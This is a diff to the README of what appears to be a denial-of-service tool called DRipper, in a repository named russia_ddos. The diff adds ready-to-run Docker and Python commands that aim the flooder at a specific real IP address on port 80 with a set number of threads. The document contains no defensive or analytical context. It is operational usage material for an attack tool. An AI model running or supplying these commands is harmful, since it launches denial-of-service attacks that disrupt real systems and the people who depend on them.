@@ -4,6 +4,14 @@ This is an optimized version of DRipper. Here is original code: https://gist.git
 
 
 ## Usage
+1. Docker
+
+```bash
+docker run -ti --rm alexmon1989/dripper2:latest -s 213.24.76.23 -p 80 -t 100
+```
+
+2. Directly with Python.
+
 Ensure you have Python 3 installed. Then clone this repo and run main.py with params you need:
 
 -s - IP;
@@ -15,5 +23,9 @@ Ensure you have Python 3 installed. Then clone this repo and run main.py with pa
 ```bash
 git clone https://github.com/alexmon1989/russia_ddos.git
 cd russia_ddos
-python -u main.py -s 213.24.76.23 -p 80 -t 1000
+
+# run
+python -u DRipper2.py -s 213.24.76.23 -p 80 -t 100
+# OR
+python3 -u DRipper2.py -s 213.24.76.23 -p 80 -t 100
 ```
